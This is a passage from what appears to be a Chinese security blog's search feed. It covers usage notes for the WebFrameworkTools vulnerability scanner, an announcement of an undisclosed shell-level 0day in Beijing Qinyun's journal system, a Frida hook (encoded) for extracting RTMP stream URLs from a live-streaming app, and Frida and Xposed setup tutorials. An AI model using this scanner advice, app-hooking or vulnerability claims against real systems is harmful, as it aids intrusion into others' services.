勾选功能演示)。线程设置和全选一样直接设置即可。include.txt可以删除或者改名如果不用勾选功能的话!!!!</li><li>注意(非常非常重要):线程数不要设置太大。线程数越大结果越不准确!!!!!。尽量调低线程数字或者就用默认线程跑就行了!!!!</li><li>非回显漏洞采用dnslog 验证确保联网。如果在局域网不联网环境下dnslog验证的漏洞全部无法验证。采用dnslog验证如果icmp不出网可能会漏掉某些有漏洞的网站</li><li>遇到postData是jason格式时候必须 Content-type:application/json 而不是默认格式<br/></li><li>Dlink漏洞需要有WebFrameworkTools.exe.config 并且一个网站一分钟内最多可以检测三次超过三次即使漏洞存在也检测不到 这个目前反弹shell方式不清楚<br/></li><li>solr CVE-2017-12629 漏洞检测时间耗时较长请耐心等待结果</li><li>建议进行针对对性漏洞测试全量跑耗时就容易被waf封<br/></li><li>为了避免被非法利用工具软件最大支持检测url个数为100条</li><li>如果工具有误报请把你的截图附上关键url可打码。如果是-type参数请指明。啥也没有我不好判断bug点!!!!感谢支持。一起携手打造web框架自动化测试工具</li><h2 id="关于软件源码"><a href="#关于软件源码" class="headerlink" title="关于软件源码"></a>关于软件源码</h2><ul> <li> <p>2023年由于作者学习提升自己无法更新软件,另外改软件风险较大在2023年hw开发以后对外永久停止更新。由于广大渗透测试爱好者觉得此软件很不错故会找个时间进行选择性开源放出源代码。创建以下一个频道一个群后续沟通交流<br/><br>软件公告频道(软件更新源码等分享知识频道):<a href="https://t.me/SoftwareUpdateChannel">https://t.me/SoftwareUpdateChannel</a><br/><br>任何地方如果有源码或者软件的截图都是被人修改过的软件或者代码注意甄别防止后门钓鱼攻击。源码团队内部成员以前有。现所有源码均在作者手中。防止有人滥用以前源码来钓鱼修改后发布带有后门的软件。如果因此使用者的电脑被黑或者造成什么损失与作者本人无关。</br></p></li> </ul> <p><img src="https://raw.githubusercontent.com/peiqiF4ck/WebFrameworkTools-5.1-main/main/%E6%BA%90%E7%A0%81.jpg" alt="软件源代码截图"><br/></p><p><img src="https://raw.githubusercontent.com/peiqiF4ck/WebFrameworkTools-5.1-main/main/%E6%BA%90%E7%A0%811.jpg" alt="软件源代码1截图"><br/></p><p><img src="https://raw.githubusercontent.com/peiqiF4ck/WebFrameworkTools-5.1-main/main/%E6%BA%90%E7%A0%812.jpg" alt="软件源代码2截图"><br/></p><h2 id="软件开发类型"><a href="#软件开发类型" class="headerlink" title="软件开发类型"></a>软件开发类型</h2> <ul> <li>  团队协作开发核心代码博主开发,是否原创:是 </li> </ul>    <h2 id="详细用法参见"><a href="#详细用法参见" class="headerlink" title="详细用法参见"></a>详细用法参见</h2> <ul> <li> https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main </li> </ul>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>北京勤云期刊0day漏洞-可shell</title>
      <link href="/0day/2023/02/articles/51b7e07325d69b2b/"/>
      <url>/0day/2023/02/articles/51b7e07325d69b2b/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>北京勤云科技发展有限公司 期刊采编系统、编辑部办公系统、编辑部办公自动化、网刊发布系统、远程审稿系统、远程投稿系统、读者订阅系统、期刊搜索、勤云软件、期刊办公自动化。</p><h2 id="漏洞截图"><a href="#漏洞截图" class="headerlink" title="漏洞截图"></a>漏洞截图</h2><p>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302061656585.png" alt="漏洞截图1"></p><p>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302061657368.png" alt="漏洞截图2"></p><h2 id="源码截图"><a href="#源码截图" class="headerlink" title="源码截图"></a>源码截图</h2><p>   <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302061719127.png" alt="源码截图"></p><h2 id="是否博主独立挖掘"><a href="#是否博主独立挖掘" class="headerlink" title="是否博主独立挖掘"></a>是否博主独立挖掘</h2><pre><code><pre class="language-none"><code class="language-none">   是</code></pre></code></pre><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><pre><code> <pre class="language-none"><code class="language-none"> 非公开 </code></pre></code></pre>]]></content>
      
      
      <categories>
          
          <category> 0day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> 0day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>直播app 获取rtmp播放地址-腾讯播放器Frida-hook</title>
      <link href="/androidreverse/2023/01/articles/b9d040d0979b56be/"/>
      <url>/androidreverse/2023/01/articles/b9d040d0979b56be/</url>
      
        <content type="html"><![CDATA[<h1 id="分析app"><a href="#分析app" class="headerlink" title="分析app"></a>分析app</h1><ul><li>把app放到jadx 里面找到包名如下图<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101543624.png"></li><li>找到图片里面的方法<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101544176.png"></li><li>Hook图片里面的方法<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101545128.png"></li></ul><h2 id="hook代码"><a href="#hook代码" class="headerlink" title="hook代码"></a>hook代码</h2>   <pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">FoVplMzAwMTQ5NTI3ZTcyZTE0NzQ1YjUxMTUzZTgyNGE0ZmQ1Zjk0Yjg3Zjk4YjRmZWZmNTBhOGU4NGY0Y2YzMjk0OGRmNGM0NTM5MzA5ZWMwODlhYjExZDdiNWQ5MDhhZjNhMzg5NTJiNzJlOTRiNWM1YTEwYmY0Mzc4ZDJkMzcyYTQ0MjUzZjdlNjI1MDQ0Y2RjMTFlNjFmOTU1NGI3MTRkNWRiYzIwMzk0MGJhNGE4ZTNmYzZkYWU2ZTJmM2M3MThmOGU5ZWViZTRkNjNlZDMwZjJmZjRiYzViMzE3MmI1ZDE3NzI5ZTkyNmQ5NmUyYWYxMDFjZDhjOGQ3NDExNTQ4MWUxOTI1ZjA5YTVkODk2NzNhNDcwY2U3MjRjNTNkYzk1ZGUyMDFkNzNlNDAyODhmMTVmYmNkODM2YWM2Y2MyYWNiNGM4ZWFjNmFkYzM1NjA3ZWRlMmM0NmZmYzlkM2EwMDY2ZGExMTU4MTE4MTFhYTNmZjFlYTZkYzAxNTg4NTJhMjE4NTNiN2RlZjcyYjRkZmJjMzZlYjliMDk5NmYwZWM3YWIyOTU1M2Q0YTQzNWEwYWQxMTg1MTQ0NmVlOTBiNTgxYzYzNjExY2IxZjZhYTg2MWMxZDcxNzBkYjQ4NWQ1ZjI5ZmMyOWNlNjAwZWM4YTJjZjliZDk2NDUxM2I2YmVhNzhjMzk1MmEwY2UwN2ZiZmMyZmE0YmQyYzAzNmM0YmViMDgzMTBiYjU0NTJmMzM5NTE2NWY4Y2QxYjdmMWYyMmE3NzFlN2U1MWNmNzA1NzYxOTgyOTM5N2ZkNDYwODQ0MzNjMzYyMDlhODAyMGFlOGMxYTc0NDhmNzUzNGRlNGNiZjE5ZWM0ZDRiYTdmMTY0YzkyN2RlMWI0NTJjZjJmZDZkNjViMTg0NDdmY2I5NzBlNDAyYTdiZmU4NmMzMDdhYmM2OWU4ZGMzNmNkYzY4YjEwNmZlMjljMmJlMTlkNGFlZGRmN2QxNDcyNzEyZDhmMmM4Yjk1YjZlZTIzZDU4ZjdhYjhkODhhNDA4OTRlOWUwODU0MDM3ZTMxYzk2ZjlhNmE4Y2M5MzMwNDQ3M2RjOWY3NTZlNTU0OGZmZTU1MDQ4YjA5YzVkOWFkYzBiMDhiODRkMWQ1NDM2MzcwMmUxYmQzMDY2ZTMxZTQwYmJjNDMxYjVmMWY0YzhlYTkzNmQ0OTE0MmJkNDQ4ZDRkYzdlNjZhZDFiYjIwMDE4ZGIzY2YyMzUxMTgzOWM1Zjc0MmZhZGY0NDMyYzllZjRjOWU2Py   </code></pre><ul><li>效果(当然得有一定的frida使用基础)<br>   <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101549477.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> original </tag>
            
            <tag> Vip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FriDa安装</title>
      <link href="/androidreverse/2023/01/articles/a94394783b10c35a/"/>
      <url>/androidreverse/2023/01/articles/a94394783b10c35a/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Frida 是一款基于 Python + JavaScript 的 Hook 与调试框架。<br>Firda 是一款易用的跨平 Hook 工具， Java 层到 Native 层的 Hook 无所不能，是一种 动态 的插桩工具，可以插入代码到原生 App 的内存空间中，动态的去监视和修改行为，原生平台包括 Win、Mac、Linux、Android、iOS 全平台。静态二进制插桩：在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件。动态二进制插桩：在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变。</p><h2 id="frida和安卓平台以及python环境关系介绍"><a href="#frida和安卓平台以及python环境关系介绍" class="headerlink" title="frida和安卓平台以及python环境关系介绍"></a>frida和安卓平台以及python环境关系介绍</h2><ul><li><p>由于frida基于python所以要安装python环境。不同版本的frida应用版本也不同例如:</p><ul><li>frida12.3.6 Android5-6 Python3.7 </li><li>frida12.8.0 Android7-8 Python3.8 </li><li>frida14+  Android9+ Python3.8</li></ul></li></ul><h2 id="python环境安装"><a href="#python环境安装" class="headerlink" title="python环境安装"></a>python环境安装</h2><ul><li><p>由于安卓版本不同我用的安卓是安卓10所以安装的python版本是 3.8以上的版本</p><ul><li><p><a href="https://www.python.org/downloads/">python官方网站下载</a><br> 如下图直接选择python3.8.6下载即可<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261942355.png" alt="python下载截图"></p></li><li><p><a href="https://www.cnblogs.com/lvtaohome/p/11121377.html">python安装参考文章太简单我就不演示了</a>注意要把python加入系统环境变量中</p></li><li><p>安装成功标志 如下图:<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261946578.png" alt="python安装成功标志"></p></li></ul></li></ul><h2 id="frida下载和安装-pc客户端"><a href="#frida下载和安装-pc客户端" class="headerlink" title="frida下载和安装(pc客户端)"></a>frida下载和安装(pc客户端)</h2><ul><li><p>python安装frida pip install frida  这样安装默认安装最新版本如果想指定版本安装那么到<a href="https://github.com/frida/frida/releases/">https://github.com/frida/frida/releases/</a> 查看版本号安安装例如<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261952214.png" alt="frida版本查看"> pip install frida&#x3D;&#x3D;15.1.17   其他版本的话把15.1.17替换一下就行了我就按最新版本来说了</p></li><li><p>安装frida-tools 下图 pip install frida-tools&#x3D;&#x3D;10.5.4<br>  <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202261959609.png" alt="frida-tools版本">  </p></li><li><p>注意frida版本一定要和frida-tools对应 即15.1.7 对应的frida-tools版本是 10.5.4。卸载的话把install改成uninstall即可 pip uninstall frida-tools&#x3D;&#x3D;10.5.4</p></li><li><p>验证frida 是否安装成功标志如下图 frida –v  import frida  没有报错说明安卓成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262015412.png" alt="验证是否成功"></p></li></ul><h2 id="frida下载和安装-也就是安卓端服务端"><a href="#frida下载和安装-也就是安卓端服务端" class="headerlink" title="frida下载和安装(也就是安卓端服务端)"></a>frida下载和安装(也就是安卓端服务端)</h2><ul><li><p>首先确定手机的型号(adb shell getprop ro.product.cpu.abi) 然后在frida搜索一下<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262006695.png" alt="确定手机型号"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262010155.png" alt="下载"></p></li><li><p>下载完毕解压然后使用推送adb push xxxxx &#x2F;data&#x2F;local&#x2F;tmp 目录下。然后改名并且赋予执行权限 chomd 777 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;fsarm64<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301081646285.png" alt="推送"></p></li><li><p>启动sever .&#x2F;fsarm64 没有报错说明成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262017158.png" alt="没有报错成功"></p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>至此frida安装完毕。上面涉及adb 这些和手机型号我这里用的是Pixel 一代 安卓10 某宝网站有卖 可以自行购买。下课。后续我还会发表相关教程</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>夜神模拟器 7.0 安卓 64位安装 Xposed-并且激活</title>
      <link href="/androidreverse/2023/01/articles/6a83169aaad6252d/"/>
      <url>/androidreverse/2023/01/articles/6a83169aaad6252d/</url>
      
        <content type="html"><![CDATA[<h1 id="Xposed下载"><a href="#Xposed下载" class="headerlink" title="Xposed下载"></a>Xposed下载</h1><p>xposed下载地址:<a href="https://github.com/youling257/XposedTools/files/1931996/xposed-x86_64.zip,%E8%A7%A3%E5%8E%8B%E5%88%9B%E5%BB%BAxposed,system%E6%96%87%E4%BB%B6%E5%A4%B9">https://github.com/youling257/XposedTools/files/1931996/xposed-x86_64.zip,解压创建xposed,system文件夹</a> 并且把压缩包文件拷贝到system文件夹拷贝到 xposed下面并且把scrip.sh脚本拷贝到xposed里面</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101236058.png" alt="把script.sh拷贝到xposed里面"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101241884.png"></p><p>然后打包压缩。</p><h2 id="安装前准备"><a href="#安装前准备" class="headerlink" title="安装前准备"></a>安装前准备</h2><ul><li><p>开启模拟器的usb调试模式。来到设置-关于平板电脑如下图</p><ul><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101244494.png" alt="来到关于平板电脑"></p></li><li><p>来到版本号点击5次进入usb调试模式如下图</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101246784.png" alt="进入usb调试模式"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101247342.PNG" alt="点击5次进去调试模式"></p></li><li><p>进去夜神模拟器安装目录。查看模拟器端口</p></li><li><p>adb devices</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101250569.png"></p></li><li><p>拷贝xposed.zip  到模拟器&#x2F;system&#x2F; 文件夹。执行下面两个命令赋予权限</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101251864.png"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101252395.png"></p></li><li><p>进入模拟器查看解压文件 </p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101253452.png"></p></li><li><p>解压</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101254749.png"></p></li><li><p>切换到xposed文件夹下。</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101255910.png"></p></li></ul></li></ul><h2 id="在模拟器里面安装xposed"><a href="#在模拟器里面安装xposed" class="headerlink" title="在模拟器里面安装xposed"></a>在模拟器里面安装xposed</h2><ul><li>运行脚本<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101257021.png"></li></ul></li><li>拷贝xposed安装包<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101258737.png"></li></ul></li><li>在执行一次脚本<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101258643.png"></li></ul></li><li>重启模拟器<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101259605.png"></li></ul></li><li>出现下图这个在重启一次<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101300896.png"></li></ul></li><li>出现下图继续重启<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101301634.png"></li></ul></li><li>再次重启已经激活<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101301475.png"></li></ul></li><li>接下来就可以安装xposed插件了如下图<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101303608.png"></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xposed </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
